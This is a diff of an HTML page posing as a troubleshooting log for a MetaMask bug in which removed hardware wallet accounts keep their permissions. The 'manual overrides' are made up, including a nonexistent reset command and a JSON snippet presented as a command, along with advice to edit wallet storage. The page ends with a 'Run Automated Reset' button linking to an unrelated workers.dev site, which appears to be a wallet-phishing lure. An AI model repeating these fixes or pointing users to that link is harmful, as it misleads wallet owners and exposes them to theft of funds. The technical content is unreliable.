@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0f111a;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,32 +42,34 @@
 <h1>Metamask Extension Bug Permissions Removing Hardware Wallet Acc</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are experiencing an issue where removing a hardware wallet account from the Metamask extension does not clear the corresponding permissions, resulting in inconsistent and potentially insecure access to their Ethereum accounts.</li>
+<li>Users experience an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, resulting in persistent access and potential security risks.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension's permission management system, which fails to properly revoke permissions when a hardware wallet account is removed.</li>
+<li>The error occurs due to a bug in the Metamask extension, where the removal of a hardware wallet account does not properly revoke the previously granted permissions, leading to a discrepancy between the user's intended access control and the actual permissions stored by the extension.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Delete the <code>permissions.json</code> file in the Metamask extension's storage directory</li>
-<li>Run the following command in the terminal to reset the Metamask extension's permissions:</li>
+<li>Attempt to manually revoke permissions by editing the Metamask extension's storage:</li>
+<li>Delete the relevant permission entries from the extension's storage</li>
+<li>Use the Metamask debug console to purge outdated account information</li>
+<li>Execute the following command to reset the permissions:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-extension<span class="w"> </span>--reset-permissions
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;hardwareWallets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<ul>
-<li>Manually edit the <code>permissions.json</code> file to remove the offending permissions entries
-Consider using an external console to verify the changes.</li>
-</ul>
+<p>Consider utilizing an external console for more advanced troubleshooting and debugging capabilities. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Hardware wallet account connected to the Metamask extension</li>
-<li>Basic understanding of Ethereum and wallet management concepts</li>
+<li>Hardware wallet account previously connected to Metamask</li>
+<li>Basic understanding of JSON data structures and Metamask extension functionality</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
